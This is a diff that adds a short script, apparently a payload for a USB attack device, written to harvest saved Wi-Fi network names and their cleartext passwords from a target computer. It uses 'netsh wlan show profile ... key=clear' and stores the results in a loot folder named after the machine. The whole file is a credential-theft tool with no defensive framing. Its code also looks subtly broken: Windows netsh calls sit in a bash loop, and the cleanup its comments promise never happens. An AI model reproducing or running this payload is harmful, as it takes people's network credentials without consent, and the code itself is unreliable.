@@ -1,0 +1,31 @@
+LED B
+
+# Create the loot directory
+mkdir -p $LOOT/WifiPass
+
+# Get the computer name and target IP
+TARGET_NAME=$(GET TARGET_NAME)
+TARGET_IP=$(GET TARGET_IP)
+
+# Get the network information and save it to a file
+netsh wlan show profiles > $LOOT/WifiPass/networks.txt
+
+# Extract network names and passwords, and save them to a file
+while read line
+do
+  name=$(echo $line | grep -oP "(?<=All User Profile\s*: ).*")
+  password=$(netsh wlan show profile "$name" key=clear | grep -oP "(?<=Key Content\s*: ).*")
+  if [[ -n "$password" && "$password" != "Present" && "$password" != "Absent" && "$password" != "Material" ]]
+  then
+    echo "$name" >> $LOOT/WifiPass/$TARGET_NAME.txt
+    echo "$password" >> $LOOT/WifiPass/$TARGET_NAME.txt
+    echo "" >> $LOOT/WifiPass/$TARGET_NAME.txt
+  fi
+done < $LOOT/WifiPass/networks.txt
+
+# Eject the USB safely and remove the networks file
+LED W
+EJECT
+
+# Clean up and exit
+LED G
